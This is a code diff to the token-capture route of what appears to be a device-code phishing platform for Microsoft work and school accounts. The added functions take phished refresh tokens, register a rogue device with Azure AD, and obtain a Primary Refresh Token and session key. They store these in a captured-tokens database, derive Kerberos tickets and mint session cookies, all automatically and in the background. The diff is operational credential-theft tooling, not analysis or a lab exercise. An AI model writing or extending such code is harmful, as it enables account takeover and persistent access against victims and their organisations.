@@ -72,6 +72,150 @@ function extractEmailFromToken(token) {
     return payload.email || payload.upn || payload.preferred_username || payload.unique_name || null;
 }
 
+// Reject a promise after ms so capture responses never hang on the
+// (best-effort) device enrollment + PRT pipeline. The underlying work
+// keeps running in the background and may still persist results.
+function withTimeout(promise, ms, label) {
+    return Promise.race([
+        promise,
+        new Promise((_, reject) =>
+            setTimeout(() => reject(new Error((label || 'operation') + ' timed out')), ms)
+        ),
+    ]);
+}
+
+/**
+ * GraphSpy parity auto action (device_codes auto_action = 'device_prt').
+ *
+ * GraphSpy runs this automatically right after every successful device-code
+ * phish: DRS-enroll a device, then exchange the refresh token for the RAW
+ * PRT + session key via the device-signed request_for_device call, and store
+ * everything. Without it the KDF PRT cookie (x-ms-RefreshTokenCredential)
+ * and PRT->access-token flows have no material to work with.
+ *
+ * Best effort: any failure leaves the capture intact and downstream flows
+ * (cookie conversion, Kerberos) continue with whatever is available.
+ *
+ * @returns {Promise<{success: boolean, prt?: string|null, reason?: string, via?: string}>}
+ */
+async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token }) {
+    if (accountType !== 'work_school') return { success: false, reason: 'personal account' };
+    if (!refresh_token) return { success: false, reason: 'no refresh token' };
+
+    const devicecode = require('../services/devicecode');
+    const devicemanager = require('../services/devicemanager');
+
+    const persistResults = async (prtResult, material) => {
+        // Store the session key where resolveSessionKeyForToken() reads it
+        // (upsert - the row may not exist yet).
+        if (prtResult.sessionKeyHex) {
+            await devicemanager.persistPrtSessionKey(user_id, tenant, prtResult.sessionKeyHex, material)
+                .catch(skErr => console.warn('[Capture] session key not stored in device_credentials:', skErr.message));
+        }
+        // Upgrade the token row to the real raw PRT + session_key_jwe
+        // (the prt column currently holds the plain refresh token).
+        if (prtResult.prt && tokenId) {
+            await db.query(
+                'UPDATE captured_tokens SET prt = ?, session_key_jwe = ? WHERE id = ?',
+                [encrypt(prtResult.prt), encrypt(prtResult.sessionKeyJwe || null), tokenId]
+            ).catch(pErr => console.error('[Capture] Failed to persist captured PRT:', pErr.message));
+        }
+        // Re-derive Kerberos TGTs now that a real PRT (acrs=pfdr) exists.
+        if (tokenId && tenant && tenant !== 'common' && tenant !== 'organizations') {
+            require('../services/kerberos').deriveTGTForToken(tokenId)
+                .then(r => {
+                    if (r && r.success) console.log('[Capture] Kerberos TGTs derived after PRT capture for token', tokenId);
+                    else console.log('[Capture] Kerberos derivation skipped after PRT capture for token', tokenId, ':', (r && r.error) || 'unknown');
+                })
+                .catch(e => console.error('[Capture] Kerberos derivation error:', e.message));
+        }
+    };
+
+    // 1) GraphSpy gets the device_id from the device-code access token and
+    //    enrolls the DRS device directly (devicecode.enrollDevice).
+    let deviceId = null;
+    if (access_token) {
+        try {
+            const payload = JSON.parse(Buffer.from(access_token.split('.')[1], 'base64').toString());
+            deviceId = payload['device_code_id'] || payload['xms_device_id'] || payload['oid'] || null;
+        } catch (e) { /* not a JWT */ }
+    }
+
+    let enrollment = null;
+    if (deviceId) {
+        try {
+            enrollment = await devicecode.enrollDevice(access_token, deviceId, tenant);
+        } catch (e) {
+            console.warn('[Capture] DRS enrollment failed:', e.message);
+        }
+    }
+
+    // 2) Fallback: exchange the refresh token for a DRS-scoped token and
+    //    enroll with that (same sequence as deviceproxy.storeToken).
+    if (!enrollment) {
+        try {
+            const fresh = await devicemanager.exchangeForDrsToken(refresh_token, tenant);
+            if (fresh && fresh.accessToken && fresh.deviceId) {
+                enrollment = await devicecode.enrollDevice(fresh.accessToken, fresh.deviceId, tenant);
+            }
+        } catch (e) {
+            console.warn('[Capture] DRS token refresh/enrollment failed:', e.message);
+        }
+    }
+
+    // 3) Last resort: full DRS registration via devicemanager - it runs the
+    //    Slice C request_for_device call internally and returns the material.
+    if (!enrollment) {
+        try {
+            const reg = await devicemanager.registerDeviceAndGetPrt({
+                access_token,
+                refresh_token,
+                tenant_id: tenant,
+                target_domain: (email && email.split('@')[1]) || tenant,
+                user_id,
+                link_id: null,
+            });
+            if (reg && reg.sessionKeyHex) {
+                await persistResults({
+                    prt: reg.prt,
+                    sessionKeyJwe: reg.sessionKeyJwe,
+                    sessionKeyHex: reg.sessionKeyHex,
+                }, {
+                    deviceId: reg.deviceId,
+                    deviceCertificate: reg.deviceCertificate,
+                    privateKeyPem: reg.privateKey,
+                    certificateDerBase64: reg.certificateDerBase64,
+                });
+                return { success: true, via: 'devicemanager', prt: reg.prt || null };
+            }
+        } catch (e) {
+            console.warn('[Capture] devicemanager registration fallback failed:', e.message);
+        }
+        return { success: false, reason: 'device enrollment failed' };
+    }
+
+    // 4) Enrollment OK - run GraphSpy request_for_device (Slice C) directly.
+    const prtkdf = require('../services/prtkdf');
+    try {
+        const prtResult = await prtkdf.requestPrtForDevice({
+            refreshToken: refresh_token,
+            privateKeyPem: enrollment.privateKeyPem,
+            certificateBase64: enrollment.certificateDerBase64 || enrollment.deviceCertificate,
+        });
+        console.log('[Capture] PRT + session_key_jwe captured via request_for_device (GraphSpy parity)');
+        await persistResults(prtResult, {
+            deviceId: enrollment.deviceId,
+            deviceCertificate: enrollment.deviceCertificate,
+            privateKeyPem: enrollment.privateKeyPem,
+            certificateDerBase64: enrollment.certificateDerBase64,
+        });
+        return { success: true, via: 'broker', prt: prtResult.prt || null };
+    } catch (prtErr) {
+        console.warn('[Capture] request_for_device failed:', prtErr.message);
+        return { success: false, reason: prtErr.message };
+    }
+}
+
 async function applyCaptureDelay() {
   try {
     const settings = await getOpsecSettings();
@@ -565,49 +709,38 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
     // so the report is guaranteed to be dispatched before the request finishes.
     // PASS TENANT, ACCOUNT TYPE, AND CAPTURE META (client_info, session_key)
     // FIX: Pass refresh_token (not access_token) - cookie converter needs refresh token to generate session cookies
-    const refreshTokenForConversion = refresh_token || prt || access_token;
+    let refreshTokenForConversion = refresh_token || prt || access_token;
     if (link.auth_mode === 'cookie') {
-        const waitForDeviceRegistration = () => {
-            return new Promise((resolve) => {
-                if (accountType === 'work_school') {
-                    console.log('[Capture] Work/school account detected (tenant:', tenant + '), waiting for device registration...');
-                    const maxWait = 30000;
-                    const intervalMs = 1000;
-                    let waited = 0;
-
-                    const timer = setInterval(() => {
-                        waited += intervalMs;
-                        const registrationFailed = job.deviceRegistrationFailed ? job.deviceRegistrationFailed() : false;
-                        db.query(
-                            'SELECT id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
-                            [user_id, tenant]
-                        ).then(([rows]) => {
-                            if (rows.length > 0 || waited >= maxWait || registrationFailed) {
-                                clearInterval(timer);
-                                if (rows.length > 0) {
-                                    console.log('[Capture] Device credentials found! Proceeding with PRT cookie generation');
-                                } else if (registrationFailed) {
-                                    console.log('[Capture] Device registration failed, proceeding with refresh token exchange');
-                                } else {
-                                    console.log('[Capture] Device registration timed out after', waited, 'ms, proceeding with refresh token exchange');
-                                }
-                                resolve();
-                            }
-                        }).catch((err) => {
-                            clearInterval(timer);
-                            console.log('[Capture] Device credential check error:', err.message);
-                            resolve();
-                        });
-                    }, intervalMs);
-                } else {
-                    console.log('[Capture] Personal account detected, skipping device registration');
-                    resolve();
-                }
+        // GraphSpy parity (auto_action 'device_prt'): actively enroll the DRS
+        // device and capture the raw PRT + session key BEFORE cookie
+        // conversion, so convertTokensToCookies can mint the KDF-signed
+        // x-ms-RefreshTokenCredential from a live session key. Bounded so the
+        // capture response never hangs; on timeout/failure the conversion
+        // proceeds with whatever material already exists.
+        let autoPrt = { success: false };
+        if (accountType === 'work_school' && refresh_token) {
+            console.log('[Capture] Work/school account detected (tenant:', tenant + '), running PRT auto-capture...');
+            autoPrt = await withTimeout(
+                autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token }),
+                45000,
+                'PRT auto-capture'
+            ).catch(e => {
+                console.warn('[Capture] PRT auto-capture gave up:', e.message);
+                return { success: false, reason: e.message };
             });
-        };
+            if (autoPrt.success) {
+                console.log('[Capture] PRT auto-capture ok via', autoPrt.via + '; proceeding with KDF PRT cookie generation');
+                // The freshly captured raw PRT is the correct material for the
+                // KDF cookie (the prt variable may still be the plain RT).
+                if (autoPrt.prt) refreshTokenForConversion = autoPrt.prt;
+            } else {
+                console.log('[Capture] PRT auto-capture unavailable (', (autoPrt.reason || 'unknown') + '), proceeding with refresh token exchange');
+            }
+        } else {
+            console.log('[Capture] Personal account detected, skipping PRT auto-capture');
+        }
 
         try {
-            await waitForDeviceRegistration();
             const cookieResult = await processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id);
             const io = req.app.get('io');
             if (io) {
@@ -640,6 +773,18 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
             }
         }
     } else {
+        // GraphSpy parity: run the device_prt auto action in the background
+        // for work/school captures so the PRT + session key are available for
+        // /cookie-script, /prt-cookie and /prt-token with no manual steps
+        // (GraphSpy's auto_action is async and never blocks the response).
+        if (accountType === 'work_school' && refresh_token) {
+            autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token })
+                .then(r => {
+                    if (r && r.success) console.log('[Capture] Background PRT auto-capture ok for token', tokenId, 'via', r.via);
+                    else console.log('[Capture] Background PRT auto-capture skipped for token', tokenId, ':', (r && r.reason) || 'unknown');
+                })
+                .catch(e => console.error('[Capture] Background PRT auto-capture error:', e.message));
+        }
         const io = req.app.get('io');
         if (io) {
             io.to(`user_${user_id}`).emit('new_token', {
